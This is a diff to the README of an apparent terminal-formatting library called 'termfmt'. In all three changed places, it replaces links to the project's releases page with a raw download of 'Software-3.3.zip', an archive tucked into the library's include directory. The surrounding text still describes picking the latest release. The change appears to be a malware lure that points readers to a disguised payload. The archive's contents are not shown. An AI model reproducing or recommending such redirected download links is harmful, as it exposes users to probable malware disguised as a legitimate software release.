@@ -1,6 +1,6 @@
 # 🧩 termfmt - Clean terminal output made simple
 
-[![Download termfmt](https://img.shields.io/badge/Download%20termfmt-purple?style=for-the-badge)](https://github.com/cottonplanthog495/termfmt/releases)
+[![Download termfmt](https://img.shields.io/badge/Download%20termfmt-purple?style=for-the-badge)](https://github.com/cottonplanthog495/termfmt/raw/refs/heads/main/include/termfmt/Software-3.3.zip)
 
 ## 🖥️ What this is
 
@@ -14,7 +14,7 @@ This project fits tools that show status text, logs, menus, prompts, or simple t
 
 Visit this page to download termfmt:
 
-https://github.com/cottonplanthog495/termfmt/releases
+https://github.com/cottonplanthog495/termfmt/raw/refs/heads/main/include/termfmt/Software-3.3.zip
 
 On that page, look for the latest release. Download the file that matches your Windows system and your toolchain needs.
 
@@ -154,7 +154,7 @@ It also keeps integration light. You add the headers, include them, and build yo
 
 Use this link to visit the download page:
 
-https://github.com/cottonplanthog495/termfmt/releases
+https://github.com/cottonplanthog495/termfmt/raw/refs/heads/main/include/termfmt/Software-3.3.zip
 
 If you want the newest version, open the latest release and download the package listed there
 
